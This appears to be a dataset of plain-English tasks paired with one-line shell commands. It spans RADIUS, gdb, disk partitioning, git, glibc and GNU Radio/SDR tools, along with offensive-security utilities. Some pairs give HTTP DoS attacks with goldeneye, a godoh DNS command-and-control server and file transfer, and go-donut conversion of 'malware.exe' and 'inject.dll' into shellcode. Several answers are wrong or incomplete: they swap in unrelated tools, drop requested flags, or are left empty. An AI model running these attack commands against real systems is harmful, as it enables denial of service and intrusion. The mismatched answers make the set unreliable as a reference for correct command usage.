{"input": "Send an accounting request to the RADIUS server at 10.1.1.1, using IPv4, with debugging enabled, and read the packets from a file named \"accounting_packets.txt\"", "answer": "radeapclient -4 -x -f accounting_packets.txt 10.1.1.1 acct"}
{"input": "List all supported encryption algorithms in radsecret", "answer": ""}
{"input": "Capture RADIUS packets from the `eth1` interface, use the RADIUS secret `mysecret`, and print more debugging information", "answer": "radsniff -i eth1 -s mysecret -x"}
{"input": "Send a RADIUS authentication request using the PAP method to the server at 192.168.1.100 on port 1812, with the username \"testuser\", password \"testpass\", NAS port number 0, and shared secret \"testing123\". Enable debug output for detailed logging", "answer": "radtest -t pap -x testuser testpass 192.168.1.100:1812 0 testing123"}
{"input": "List all online users in raw, comma-delimited format, including session IDs and port types", "answer": "who -u | awk '{print $1 \",\" $2 \",\" $5}'"}
{"input": "Display all online users with all available information, including accounting stop details, and save the output to a file", "answer": "who -a > online_users.txt"}
{"input": "Remove all rogue entries for the user \"Admin\" (case-sensitive) from the NAS with IP address 172.16.0.1 and port 1813, using the RADIUS configuration in `/usr/local/etc/raddb` and dictionaries in `/usr/local/etc/raddb/dict`", "answer": "radzap -d /usr/local/etc/raddb -D /usr/local/etc/raddb/dict -N 172.16.0.1 -P 1813 -U Admin"}
{"input": "Print all active entries for the IP address `192.168.1.100` from the FreeRadius ippool database file `ippool.db` with the index database `index.db`", "answer": "rlm_ippool_tool -c 192.168.1.100 ippool.db index.db"}
{"input": "Update the old format FreeRadius ippool database file `old_ippool.db` to the new format and save it as `new_ippool.db`", "answer": "rlm_ippool_tool -u old_ippool.db new_ippool.db"}
{"input": "Run freeradius-wpe in the foreground with full debugging enabled and log the output to a file named `radius_log.txt`", "answer": "freeradius-wpe -f -X > radius_log.txt 2>&1"}
{"input": "Connect to a remote desktop at IP address 192.168.1.100 using the username \"JohnDoe\" and password \"Pwd123!\" in fullscreen mode", "answer": "xfreerdp /u:JohnDoe /p:'Pwd123!' /v:192.168.1.100 /f"}
{"input": "Connect to a remote desktop at `192.168.1.100` using the username \"JohnDoe\" and password \"Pwd123!\", and enable clipboard redirection", "answer": "xfreerdp /u:JohnDoe /p:Pwd123! /v:192.168.1.100 /clipboard"}
{"input": "Connect to a remote desktop at `192.168.1.100` and enable SSH agent forwarding", "answer": "xfreerdp /v:192.168.1.100 /ssh-agent"}
{"input": "Connect to a remote desktop at `192.168.1.100` and disable encryption for testing purposes", "answer": "xfreerdp /v:192.168.1.100 /sec:rdp"}
{"input": "Connect to a remote desktop at `192.168.1.100` with username \"JohnDoe\" and password \"Pwd123!\", enabling smartcard authentication", "answer": "xfreerdp /u:JohnDoe /p:Pwd123! /v:192.168.1.100 /smartcard"}
{"input": "Connect to a remote desktop at `192.168.1.100` with username \"JohnDoe\" and password \"Pwd123!\", enabling printer redirection for a local printer named \"HP_LaserJet\"", "answer": "xfreerdp /u:JohnDoe /p:Pwd123! /v:192.168.1.100 /printer:HP_LaserJet"}
{"input": "Create a certificate with a SHA-256 signature algorithm, a key length of 2048 bits, and a validity period of 12 months, saving it to the file \"my_cert.crt\"", "answer": "openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -out my_cert.crt -keyout my_cert.key"}
{"input": "Extract all data from the MSIE cookie file \"cookies_backup.dat\" and use an underscore as the field delimiter", "answer": "galleta -d _ cookies_backup.dat"}
{"input": "Debug the executable `my_program` and execute the GDB command `break main` before loading the program", "answer": "gdb -iex \"break main\" my_program"}
{"input": "Debug the executable `my_program` and suppress the GUI interface", "answer": "gdb --nw my_program"}
{"input": "Debug the executable `my_program` and use the terminal user interface (TUI)", "answer": "gdb --tui my_program"}
{"input": "Debug the executable `my_program` and change the current directory to `/home/user/project` before starting", "answer": "gdb --cd=/home/user/project my_program"}
{"input": "Debug the executable `my_program` and do not read any `.gdbinit` files", "answer": "gdb --nx my_program"}
{"input": "Generate an index for all sections of the shared library \"libexample.so\" to optimize GDB debugging", "answer": "gdb-add-index libexample.so"}
{"input": "Debug an executable named `my_program` and execute a single GDB command `break main` before loading the program", "answer": "gdb-multiarch -ex \"break main\" my_program"}
{"input": "Debug an executable named `my_program` and suppress all GDB output during startup", "answer": "gdb-multiarch --quiet my_program"}
{"input": "Debug an executable named `my_program` and use the terminal user interface (TUI) in gdb-multiarch", "answer": "gdb-multiarch --tui my_program"}
{"input": "Debug an executable named `my_program` and change the current directory to `/home/user` before starting", "answer": "gdb-multiarch --cd=/home/user my_program"}
{"input": "Debug an executable named `my_program` and fully read symbol files on first access", "answer": "gdb-multiarch --readnow my_program"}
{"input": "Debug an executable named `my_program` and do not read any `.gdbinit` files during startup", "answer": "gdb-multiarch --nx my_program"}
{"input": "Debug the executable `my_program` with TUI, passing arguments `arg1` and `arg2` to the program", "answer": "gdb -tui --args my_program arg1 arg2"}
{"input": "Debug the executable `my_program` with TUI, setting GDB's data directory to `/usr/local/share/gdb`", "answer": "gdb --tui --data-directory=/usr/local/share/gdb my_program"}
{"input": "Generate a stack trace for the process with PID 5678 to analyze its current execution state", "answer": "gstack 5678"}
{"input": "I need to check the stack trace of a running application with PID 91011 to diagnose a potential issue", "answer": "gstack 91011"}
{"input": "Start gdbserver on port 7890 to debug `/usr/bin/my_app` and include timestamps in the debugging output", "answer": "gdbserver :7890 /usr/bin/my_app"}
{"input": "Run gdbserver on port 8901 to debug `/usr/bin/example_program` and disable all threading-related RSP packets", "answer": "gdbserver --disable-packet=threads :8901 /usr/bin/example_program"}
{"input": "Create a new partition on `/dev/sdc` with partition number 1, starting at sector 2048 and ending at sector 4096", "answer": "sgdisk -n 1:2048:4096 /dev/sdc"}
{"input": "Print the partition table of the disk `/dev/sdd`", "answer": "sgdisk -p /dev/sdd"}
{"input": "Change the type code of partition number 2 on `/dev/sde` to `8300` (Linux filesystem)", "answer": "sgdisk -t 2:8300 /dev/sde"}
{"input": "Clear all partition data (GPT and MBR) on the disk `/dev/sdg`", "answer": "sgdisk -Z /dev/sdg"}
{"input": "Randomize the disk and partition GUIDs on `/dev/sdi`", "answer": "sgdisk -G /dev/sdi"}
{"input": "Change the name of partition number 1 on `/dev/sdl` to \"DataPartition\"", "answer": "sgdisk -c 1:DataPartition /dev/sdl"}
{"input": "Set the sector alignment to 2048 on `/dev/sdp`", "answer": "sgdisk -a 2048 /dev/sdp"}
{"input": "Search for all exploits related to \"FTP\" in the local getsploit database", "answer": "getsploit -s FTP"}
{"input": "Display all the concept guides available in Git", "answer": "git help -g"}
{"input": "Search for a specific pattern in all files within the repository", "answer": "git grep \"pattern\""}
{"input": "Show all configuration settings for the Git repository", "answer": "git config --list --show-origin"}
{"input": "Clone a remote Git repository using git-shell", "answer": "git clone git@example.com:repo.git"}
{"input": "Use `git-upload-pack` to sync updates from the repository located at `/var/repo/myproject` with a timeout of 30 seconds", "answer": "git-upload-pack --timeout=30 /var/repo/myproject"}
{"input": "Use `git-upload-pack` to sync updates from the repository at `/opt/repo/project` with a timeout of 120 seconds and in stateless RPC mode, while also advertising references", "answer": "git-upload-pack --timeout=120 --stateless-rpc --advertise-refs /opt/repo/project"}
{"input": "Run a diagnostic check on the Scalar-managed repository located at `/mnt/repo` to identify potential issues", "answer": "scalar -C /mnt/repo diagnose"}
{"input": "Run a custom Git command `status` on the Scalar-managed repository located at `/mnt/repo`", "answer": "scalar -C /mnt/repo run git status"}
{"input": "Scan the current directory for secrets using Gitleaks with the default configuration and output the results in JSON format", "answer": "gitleaks detect --source . --report-format json --report-path gitleaks_report.json"}
{"input": "Scan a specific repository located at `/home/user/repo` for secrets, suppress the banner, and output the results in CSV format", "answer": "gitleaks detect --source /home/user/repo --no-banner --report-format csv --report-path gitleaks_report.csv"}
{"input": "Scan a Git repository for secrets, redact any sensitive information from the logs, and set the log level to debug", "answer": "gitleaks detect --source . --redact --log-level debug"}
{"input": "Scan a repository for secrets, ignore any issues listed in a baseline file, and exit with a custom code if leaks are found", "answer": "gitleaks detect --source . --baseline-path baseline.json --exit-code 2"}
{"input": "Scan a large repository for secrets, skip files larger than 10 MB, and output the results in SARIF format", "answer": "gitleaks detect --source . --max-target-megabytes 10 --report-format sarif --report-path gitleaks_report.sarif"}
{"input": "Scan a repository for secrets using a custom configuration file and show verbose output during the scan", "answer": "gitleaks detect --source . --config custom_config.toml --verbose"}
{"input": "Retrieve all system configuration variables available on the system", "answer": "getconf -a"}
{"input": "Get the maximum length of a filename for the root directory", "answer": "getconf NAME_MAX /"}
{"input": "Find the maximum length of a pathname for the `/home` directory", "answer": "getconf PATH_MAX /home"}
{"input": "Check the maximum number of simultaneous processes allowed on the system", "answer": "getconf CHILD_MAX"}
{"input": "Retrieve all entries from the `hosts` database using `getent`, but use a specific service configuration", "answer": "getent -s custom_config hosts"}
{"input": "Convert the file `example.txt` from ASCII encoding to UTF-16 encoding and suppress any warning messages during the conversion", "answer": "iconv -f ASCII -t UTF-16 -s example.txt"}
{"input": "Convert the file `logfile.log` from UTF-16 encoding to ASCII encoding, but only include valid characters in the output", "answer": "iconv -f UTF-16 -t ASCII -c logfile.log"}
{"input": "Generate a fastloading iconv module configuration file without searching the standard directories, and save the output to `/custom/path/iconv.cache`", "answer": "iconvconfig --nostdlib -o /custom/path/iconv.cache"}
{"input": "Create a fastloading iconv module configuration file using a custom prefix `/usr/local` and save the output to `/usr/local/etc/iconv.cache`", "answer": "iconvconfig --prefix=/usr/local -o /usr/local/etc/iconv.cache"}
{"input": "Create a fastloading iconv module configuration file and save it to `/tmp/iconv.cache`, while using a custom prefix `/opt/local` for all file accesses", "answer": "iconvconfig --prefix=/opt/local -o /tmp/iconv.cache"}
{"input": "Generate a fastloading iconv module configuration file and save it to `/etc/iconv.cache`, but do not search the standard directories", "answer": "iconvconfig --nostdlib -o /etc/iconv.cache"}
{"input": "Create a fastloading iconv module configuration file and save it to `/var/lib/iconv.cache`, while using a custom prefix `/usr/local` and only searching the directories `/custom/dir1` and `/custom/dir2`", "answer": "iconvconfig --prefix=/usr/local --nostdlib -o /var/lib/iconv.cache /custom/dir1 /custom/dir2"}
{"input": "Create a fastloading iconv module configuration file and save it to `/home/user/iconv.cache`, while using a custom prefix `/opt` for all file accesses", "answer": "iconvconfig --prefix=/opt -o /home/user/iconv.cache"}
{"input": "Process only the directories `/usr/lib` and `/usr/local/lib` without building the cache", "answer": "ldconfig -n /usr/lib /usr/local/lib"}
{"input": "List all shared object dependencies for the binary `/usr/bin/gcc` and process both data and function relocations", "answer": "ldd -r /usr/bin/gcc"}
{"input": "Check for unused direct dependencies in the binary `/usr/bin/curl` and display verbose information", "answer": "ldd -u -v /usr/bin/curl"}
{"input": "Provide a verbose listing of all available locales, including their categories and keywords", "answer": "locale -avck"}
{"input": "Compile a locale definition file named \"en_US.UTF-8\" using the character map file \"UTF-8\" and the source definition file \"en_US\", while forcing the creation of output even if warnings are issued", "answer": "localedef -f UTF-8 -i en_US -c en_US.UTF-8"}
{"input": "Add the locale definition \"fr_FR.UTF-8\" to the locale archive, using the alias file \"locale.alias\" and generating big-endian output", "answer": "localedef --add-to-archive --alias-file=locale.alias --big-endian fr_FR.UTF-8"}
{"input": "Compile a locale definition file named \"es_ES.UTF-8\" using the character map file \"ISO-8859-1\" and the source definition file \"es_ES\", while suppressing all warning messages", "answer": "localedef -f ISO-8859-1 -i es_ES --quiet es_ES.UTF-8"}
{"input": "Compile a locale definition file named \"ru_RU.UTF-8\" using the character map file \"KOI8-R\" and the source definition file \"ru_RU\", while disabling hard links between installed locales", "answer": "localedef -f KOI8-R -i ru_RU --no-hard-links ru_RU.UTF-8"}
{"input": "List all dynamic shared objects for a process with PID 5678, and ensure the output is clear and detailed", "answer": "pldd 5678"}
{"input": "Check the dynamic shared objects for a process with PID 91011, and ensure the output is formatted correctly", "answer": "pldd 91011"}
{"input": "Verify the dynamic shared objects loaded into a critical system process with PID 11213", "answer": "pldd 11213"}
{"input": "List all dynamic shared objects for a process with PID 202122, and ensure the output is concise", "answer": "pldd 202122"}
{"input": "Compile the timezone data file `atlantic.zi` and restrict the output to the time range starting from 2025 using the zic tool", "answer": "zic -r @2025 atlantic.zi"}
{"input": "Generate a message catalog named \"default.cat\" from \"default_messages.txt\" and read additional input from standard input", "answer": "gencat -o default.cat default_messages.txt -"}
{"input": "Analyze the malloc trace log \"alloc_trace.log\" for the binary \"network_tool\" to find memory allocation inconsistencies", "answer": "mtrace alloc_trace.log network_tool"}
{"input": "Change the global locale settings to use the French language and set the numeric format to French as well", "answer": "update-locale LANG=fr_FR.UTF-8 LC_NUMERIC=fr_FR.UTF-8"}
{"input": "Start the Name Service Cache Daemon (nscd) in the foreground without forking, behaving like a daemon but staying attached to the terminal", "answer": "nscd -F"}
{"input": "Read the configuration data for the Name Service Cache Daemon (nscd) from a custom configuration file named 'nscd_custom.conf'", "answer": "nscd -f nscd_custom.conf"}
{"input": "Launch GNU Radio Companion with the default framework and set the logging level to error without opening any specific flowgraph file", "answer": "gnuradio-companion --log error"}
{"input": "Show all available information about the installed GNU Radio configuration", "answer": "gnuradio-config-info --print-all"}
{"input": "What is the installation prefix for GNU Radio?", "answer": "gnuradio-config-info --prefix"}
{"input": "Where is the system configuration directory for GNU Radio located?", "answer": "gnuradio-config-info --sysconfdir"}
{"input": "Can you show me the directory where GNU Radio stores user preferences?", "answer": "gnuradio-config-info --userprefsdir"}
{"input": "What is the build date of the installed GNU Radio version?", "answer": "gnuradio-config-info --builddate"}
{"input": "Which components were enabled during the GNU Radio build?", "answer": "gnuradio-config-info --enabled-components"}
{"input": "What are the CFLAGS used during the GNU Radio build?", "answer": "gnuradio-config-info --cflags"}
{"input": "What is the version of the installed GNU Radio?", "answer": "gnuradio-config-info -v"}
{"input": "Use the GNU Radio Performance Monitor to connect to a remote host at 172.16.254.1 on port 7000 for performance monitoring", "answer": "gr-perf-monitorx 172.16.254.1 7000"}
{"input": "Plot the time series of samples from the file `data.bin` starting at position 2000", "answer": "gr_plot -s 2000 data.bin"}
{"input": "Plot the time series of samples from the file `data.bin` using the `float32` data type", "answer": "gr_plot -d float32 data.bin"}
{"input": "Plot the constellation diagram for the complex data in the file `iq_data.bin` using a block size of 2000, starting from sample 500, and with a sample rate of 2.5 MHz", "answer": "gr_plot_const -B 2000 -s 500 -R 2500000 iq_data.bin"}
{"input": "Display the constellation plot for the file `radio_samples.bin` with a block size of 3000, starting from sample 2000, and a sample rate of 1.5 MHz", "answer": "gr_plot_const -B 3000 -s 2000 -R 1500000 radio_samples.bin"}
{"input": "Generate a constellation plot for the file `complex_data.bin` using the default block size and starting from the beginning of the file, but with a sample rate of 800 kHz", "answer": "gr_plot_const -R 800000 complex_data.bin"}
{"input": "Visualize the FFT of a binary file `data.bin` containing float32 data, using a block size of 5000, starting from the beginning of the file, and a sample rate of 1 MHz", "answer": "gr_plot_fft -d float32 -B 5000 -s 0 -R 1000000 data.bin"}
{"input": "Analyze the frequency domain of a binary file `capture.raw` with uint16 data type, using a block size of 10000, starting from sample 1000, and a sample rate of 10 kHz", "answer": "gr_plot_fft -d uint16 -B 10000 -s 1000 -R 10000 capture.raw"}
{"input": "Plot the FFT of a binary file `test.raw` with int32 data type, using a block size of 8000, starting from sample 1500, and a sample rate of 800 kHz", "answer": "gr_plot_fft -d int32 -B 8000 -s 1500 -R 800000 test.raw"}
{"input": "Visualize the frequency domain of a binary file `input.dat` with complex64 data type, using the default block size, starting from sample 300, and a sample rate of 2 MHz", "answer": "gr_plot_fft -d complex64 -s 300 -R 2000000 input.dat"}
{"input": "Plot the I&Q data from the file `samples.dat` with a block size of 2000, starting at position 500, and a sample rate of 2.5 MHz", "answer": "gr_plot_iq -B 2000 -s 500 -R 2500000 samples.dat"}
{"input": "Visualize the I&Q data in the file `capture.bin` using the default block size and starting position, but with a sample rate of 1 MHz", "answer": "gr_plot_iq -R 1000000 capture.bin"}
{"input": "Display the I&Q data from `signal.dat` using the default settings for block size and start position, but with a sample rate of 5 MHz", "answer": "gr_plot_iq -R 5000000 signal.dat"}
{"input": "Plot the I&Q data from `test.iq` with a block size of 3000, starting at position 200, and a sample rate of 1.5 MHz", "answer": "gr_plot_iq -B 3000 -s 200 -R 1500000 test.iq"}
{"input": "Visualize the I&Q data in `output.bin` using a block size of 4000, starting at position 1500, and a sample rate of 3 MHz", "answer": "gr_plot_iq -B 4000 -s 1500 -R 3000000 output.bin"}
{"input": "Plot the I&Q data from `samples.iq` with a block size of 10000, starting at position 2500, and a sample rate of 2 MHz", "answer": "gr_plot_iq -B 10000 -s 2500 -R 2000000 samples.iq"}
{"input": "Visualize the I&Q data in `data.bin` using the default block size and starting position, but with a sample rate of 10 MHz", "answer": "gr_plot_iq -R 10000000 data.bin"}
{"input": "Generate a plot for the file `iq_samples.dat` using `gr_plot_qt` with all features enabled to display the full range of data", "answer": "gr_plot_qt --all iq_samples.dat"}
{"input": "Extract the metadata from the file \"signal_data.dat\" where the header is detached", "answer": "exiftool signal_data.dat"}
{"input": "Use gr_read_file_metadata to read the metadata from the file \"test_file.grc\" and display the help message for additional options", "answer": "gr_read_file_metadata -h test_file.grc"}
{"input": "Compile the GRC file `example.grc` and run the program immediately after compilation without specifying an output directory", "answer": "grcc -r example.grc"}
{"input": "Compile the GRC file `example.grc` and save the compiled program to the `output` directory, but do not run it", "answer": "grcc -o output example.grc"}
{"input": "Run the tags_demo tool with a sample rate of 2 MHz, a center frequency of 900 MHz, and a burst duration of 0.2 seconds, using the device address \"192.168.10.2\"", "answer": "tags_demo --addr 192.168.10.2 --rate 2000000 --freq 900000000 --burst 0.2"}
{"input": "Configure the tags_demo tool to use a sample rate of 1.5 MHz, a center frequency of 2.4 GHz, and an idle time of 0.1 seconds between bursts, with the device address \"192.168.1.100\"", "answer": "tags_demo --addr 192.168.1.100 --rate 1500000 --freq 2400000000 --idle 0.1"}
{"input": "Run the tags_demo tool with a burst duration of 0.3 seconds, an idle time of 0.05 seconds, and a length tag key named \"packet_length\", using the device address \"10.0.0.5\"", "answer": "tags_demo --addr 10.0.0.5 --burst 0.3 --idle 0.05 --length_tag packet_length"}
{"input": "Execute the tags_demo tool with a sample rate of 500 kHz, a center frequency of 433 MHz, and a burst duration of 0.15 seconds, using the default idle time and no length tag", "answer": "tags_demo --rate 500000 --freq 433000000 --burst 0.15"}
{"input": "Use the tags_demo tool with a sample rate of 1 MHz, a center frequency of 1.8 GHz, and a length tag key named \"frame_size\", targeting the device at \"192.168.2.200\"", "answer": "tags_demo --addr 192.168.2.200 --rate 1000000 --freq 1800000000 --length_tag frame_size"}
{"input": "Display the spectrum from a UHD receiver with a carrier frequency of 1.8 GHz, a sample rate of 1.5 MHz, and a gain of 25 dB, using an FFT size of 512 bins and low averaging, while synchronizing the device to an external PPS signal", "answer": "uhd_fft -f 1.8e9 -s 1.5e6 -g 25 --fft-size 512 --fft-average low --sync pps"}
{"input": "Analyze the spectrum from a UHD receiver with a carrier frequency of 5 GHz, a sample rate of 10 MHz, and a gain of 15 dB, using an FFT size of 4096 bins and no averaging, while setting the clock source to external", "answer": "uhd_fft -f 5e9 -s 10e6 -g 15 --fft-size 4096 --fft-average off --clock-source external"}
{"input": "Save received data from a UHD device with a sample rate of 2 MHz, a frequency of 900 MHz, and a gain of 30 dB to a file named `output_data.bin`", "answer": "uhd_rx_cfile -r 2000000 -f 900000000 -g 30 output_data.bin"}
{"input": "Capture 500,000 samples from a UHD device using channel 0, an antenna port of \"RX2\", and save the data to `capture_data.bin`", "answer": "uhd_rx_cfile -c 0 -A RX2 -N 500000 capture_data.bin"}
{"input": "Save received data from a UHD device with a sample rate of 5 MHz, a frequency of 5.8 GHz, and show asynchronous message notifications, saving the data to `async_data.bin`", "answer": "uhd_rx_cfile -r 5000000 -f 5800000000 --show-async-msg async_data.bin"}
{"input": "Save received data from a UHD device with a sample rate of 10 MHz, a frequency of 3.6 GHz, and use a device address argument of `type=b200`, saving the data to `addr_data.bin`", "answer": "uhd_rx_cfile -r 10000000 -f 3600000000 -a type=b200 addr_data.bin"}
{"input": "Generate a sine wave signal with a carrier frequency of 2.4 GHz, a sample rate of 1 MHz, and a gain of 20 dB using the USRP device at IP address 192.168.10.2", "answer": "uhd_siggen -a addr=192.168.10.2 -f 2.4e9 -s 1e6 -g 20 --sine"}
{"input": "Generate a complex sine wave signal with a carrier frequency of 1.2 GHz, a sample rate of 8 MHz, and a gain of 25 dB using the USRP device at IP address 192.168.10.9", "answer": "uhd_siggen -a addr=192.168.10.9 -f 1.2e9 -s 8e6 -g 25 --sine"}
{"input": "Generate a sine wave signal with a carrier frequency of 1.8 GHz, a sample rate of 40 MHz, and a gain of 22 dB using the USRP device at IP address 192.168.10.11. Use PPS (Pulse Per Second) for time synchronization", "answer": "uhd_siggen_gui -a addr=192.168.10.11 -f 1.8e9 -s 40e6 -g 22 --sine --sync pps"}
{"input": "Enumerate DNS subdomains for the domain `example.com` using the wordlist `subdomains.txt`, with verbose output enabled, and disable progress display", "answer": "gobuster dns -d example.com -w subdomains.txt -v -z"}
{"input": "Perform DNS subdomain enumeration for `example.com` using the wordlist `subdomains.txt`, with debug output enabled, and save the results to `dns_results.txt`", "answer": "gobuster dns -d example.com -w subdomains.txt --debug -o dns_results.txt"}
{"input": "Fuzz the URL `http://10.129.228.124/FUZZ` using the wordlist `fuzzlist.txt`, with quiet mode enabled to suppress banner and noise, and use 5 threads", "answer": "gobuster fuzz -u http://10.129.228.124/FUZZ -w fuzzlist.txt -q -t 5"}
{"input": "Enumerate directories on `http://10.129.228.124` using the wordlist `common.txt`, with no progress bar displayed, and output the results to `dir_results.txt`", "answer": "gobuster dir -u http://10.129.228.124 -w common.txt -z -o dir_results.txt"}
{"input": "Start the godoh C2 server using the domain \"example.com\" and the Cloudflare DNS provider", "answer": "godoh c2 --domain example.com --provider cloudflare"}
{"input": "Receive a file from the godoh C2 server using the domain \"download.example.com\" and the raw DNS provider", "answer": "godoh receive --domain download.example.com --provider raw"}
{"input": "Convert a .NET EXE file named \"malware.exe\" to shellcode, specifying the class name \"Program\" and method name \"Main\", and save the output as \"output.bin\"", "answer": "go-donut -i malware.exe -c Program -m Main -o output.bin"}
{"input": "Convert a .NET DLL file named \"inject.dll\" to shellcode, targeting x32 architecture, and pass the parameters \"arg1 arg2\" to the method", "answer": "go-donut -i inject.dll -a x32 -p \"arg1 arg2\""}
{"input": "Convert a .NET assembly named \"payload.exe\" to shellcode, compress it using Xpress Huffman, and enable verbose output", "answer": "go-donut -i payload.exe -z 4 -v"}
{"input": "Convert a .NET DLL file named \"library.dll\" to shellcode, specify the runtime version as \"v4.0.30319\", and save the output as \"shellcode.bin\"", "answer": "go-donut -i library.dll -r v4.0.30319 -o shellcode.bin"}
{"input": "Convert a .NET DLL file named \"inject.dll\" to shellcode, specify the AppDomain name as \"MyDomain\", and save the output as \"inject.bin\"", "answer": "go-donut -i inject.dll -d MyDomain -o inject.bin"}
{"input": "Convert a .NET EXE file named \"malware.exe\" to shellcode, exit the process after execution, and output the result in PowerShell format", "answer": "go-donut -i malware.exe -x 2 -f 6"}
{"input": "Perform a HTTP DoS attack on the target URL \"http://example.com\" using 20 concurrent workers, 1000 sockets, and random HTTP methods", "answer": "goldeneye http://example.com -w 20 -s 1000 -m random"}
{"input": "Execute a HTTP DoS attack on \"http://example.org\" using the default settings but with 50 concurrent workers", "answer": "goldeneye http://example.org -w 50"}
{"input": "Perform a HTTP DoS attack on \"http://demo.com\" using 300 sockets and the 'post' method exclusively", "answer": "goldeneye http://demo.com -s 300 -m post"}
{"input": "Search for all JSON files on the domain \"api.example.com\" using goofile with a custom Google Search Engine API key", "answer": "goofile -d api.example.com -f json -k YOUR_API_KEY"}
{"input": "Find all ZIP files on the domain \"archive.org\" that contain the keyword \"backup\" using goofile", "answer": "goofile -d archive.org -f zip -q backup"}
{"input": "Restart the ADB daemon on the connected Android device with root permissions", "answer": "adb kill-server && adb start-server && adb root"}
{"input": "Format the cache partition on a Nexus device with a custom NAND page size of 4096 bytes", "answer": "fastboot format cache"}
{"input": "Start the Gophish web interface with a custom configuration file", "answer": "gophish --config /path/to/custom/config.json"}
{"input": "Crawl the website \"example.com\" with a depth of 3, using 10 threads, and save the output to a folder named \"output_folder\"", "answer": "gospider -s example.com -d 3 -t 10 -o output_folder"}
{"input": "Crawl the website \"example.com\" with a blacklist regex to exclude URLs containing \"admin\", and save the output to \"results_folder\"", "answer": "gospider -s example.com --blacklist \".*admin.*\" -o results_folder"}
{"input": "Scan all IP addresses in the range 192.168.1.0/24 using gowitness to capture screenshots of all discovered web services", "answer": "gowitness scan --cidr 192.168.1.0/24 --screenshot"}
{"input": "Generate a report of all the screenshots captured by gowitness and save it as an HTML file named \"report.html\"", "answer": "gowitness report generate --destination report.html"}
{"input": "Scan the IP address 192.168.1.100 using gowitness and save the screenshots in a custom directory named \"screenshots\"", "answer": "gowitness scan --single 192.168.1.100 --destination screenshots"}
{"input": "Scan the CIDR range 10.0.0.0/16 using gowitness and save the results in a SQLite database named \"scan_results.db\"", "answer": "gowitness scan --cidr 10.0.0.0/16 --db scan_results.db"}
{"input": "Perform a scan on the domain example.org using gowitness and save the screenshots in a directory named \"example_org_screenshots\"", "answer": "gowitness scan --single example.org --destination example_org_screenshots"}
{"input": "Skip the first 500 sectors and then scan `/dev/sde` using gpart", "answer": "gpart -k 500 /dev/sde"}
{"input": "Decrypt all GPP passwords from the file `data.xml` and filter the output to show only entries containing the word \"admin\"", "answer": "gpp-decrypt --all data.xml | grep \"admin\""}
{"input": "Start the modes_rx receiver with a frequency of 1090 MHz, a sample rate of 4 MHz, and a gain of 30 dB, while disabling the printing of decoded packets to stdout", "answer": "modes_rx -f 1090000000 -r 4000000 -g 30 -n"}
{"input": "Start the modes_rx receiver with a frequency of 1090 MHz, a sample rate of 4 MHz, and output the decoded packets to a KML file named \"output.kml\"", "answer": "modes_rx -f 1090000000 -r 4000000 -K output.kml"}
{"input": "Start the modes_rx receiver with a frequency of 1090 MHz, a sample rate of 4 MHz, and specify the GPS coordinates of the receiving station as 40.7128,-74.0060", "answer": "modes_rx -f 1090000000 -r 4000000 -l 40.7128,-74.0060"}
{"input": "Start the modes_rx receiver with a frequency of 1090 MHz, a sample rate of 4 MHz, and set the pulse detection threshold to 10 dB above noise", "answer": "modes_rx -f 1090000000 -r 4000000 -T 10"}
{"input": "Configure the modes_rx receiver to use a remote server at IP 192.168.1.100 on port 5000, set the frequency to 1090 MHz, and disable printing of decoded packets", "answer": "modes_rx -f 1090000000 -a tcp://192.168.1.100:5000 -n"}
{"input": "I want to analyze the spectrum using osmocom_fft with a sample rate of 2.4 MHz, centered at 100 MHz, and a gain of 15 dB. Enable verbose output for detailed logging.\"", "answer": "osmocom_fft -a rtl=0 -v -f 100e6 -s 2.4e6 -g 15"}
{"input": "I need to visualize the spectrum using osmocom_fft with a HackRF device, enabling both the waterfall and oscilloscope displays. Set the FFT size to 2048 bins and the update rate to 20 Hz.\"", "answer": "osmocom_fft -a hackrf -W -S --fft-size=2048 --fft-rate=20"}
{"input": "I want to analyze the spectrum using osmocom_fft with a USRP device, setting the center frequency to 900 MHz, the sample rate to 1 MHz, and enabling averaging with a factor of 0.2.\"", "answer": "osmocom_fft -a uhd -f 900e6 -s 1e6 --averaging --avg-alpha=0.2"}
{"input": "I want to analyze the spectrum using osmocom_fft with a bladeRF device, setting the center frequency to 2.4 GHz, the sample rate to 10 MHz, and enabling verbose output.\"", "answer": "osmocom_fft -a bladerf -f 2.4e9 -s 10e6 -v"}
{"input": "I need to analyze the spectrum using osmocom_fft with a HackRF device, setting the gain to 20 dB, enabling the waterfall display, and setting the FFT update rate to 25 Hz.\"", "answer": "osmocom_fft -a hackrf -g 20 -W --fft-rate=25"}
{"input": "I need to analyze the spectrum using osmocom_fft with an RTL-SDR device, setting the frequency correction to 10 ppm, enabling offset tuning mode, and setting the FFT size to 8192 bins.\"", "answer": "osmocom_fft -a rtl=0,offset_tune=1 -c 10 --fft-size=8192"}
{"input": "Generate a complex sine wave signal with a carrier frequency of 1 GHz, a sample rate of 2 MHz, and a gain of 20 dB using the osmocom_siggen_nogui tool", "answer": "osmocom_siggen_nogui --sine -f 1e9 -s 2e6 -g 20"}
{"input": "Create a constant carrier signal with a frequency of 900 MHz, a sample rate of 1.5 MHz, and an output amplitude of 0.5 using osmocom_siggen_nogui", "answer": "osmocom_siggen_nogui --const -f 900e6 -s 1.5e6 --amplitude 0.5"}
{"input": "Generate a two-tone signal for IMD testing with a carrier frequency of 2.4 GHz, a sample rate of 5 MHz, and a gain of 15 dB using osmocom_siggen_nogui", "answer": "osmocom_siggen_nogui --2tone -f 2.4e9 -s 5e6 -g 15"}
{"input": "Generate a Gaussian random output signal with a carrier frequency of 800 MHz, a sample rate of 1 MHz, and a gain of 10 dB using osmocom_siggen_nogui", "answer": "osmocom_siggen_nogui --gaussian -f 800e6 -s 1e6 -g 10"}
{"input": "Generate a GMSK modulated GSM burst sequence with a carrier frequency of 1.8 GHz, a sample rate of 3 MHz, and a gain of 25 dB using osmocom_siggen_nogui", "answer": "osmocom_siggen_nogui --gsm -f 1.8e9 -s 3e6 -g 25"}
{"input": "Generate a swept sine wave signal with a carrier frequency of 2 GHz, a sample rate of 10 MHz, and a gain of 30 dB using osmocom_siggen_nogui", "answer": "osmocom_siggen_nogui --sweep -f 2e9 -s 10e6 -g 30"}
{"input": "Generate a uniform random output signal with a carrier frequency of 1.5 GHz, a sample rate of 2.5 MHz, and a gain of 18 dB using osmocom_siggen_nogui", "answer": "osmocom_siggen_nogui --uniform -f 1.5e9 -s 2.5e6 -g 18"}
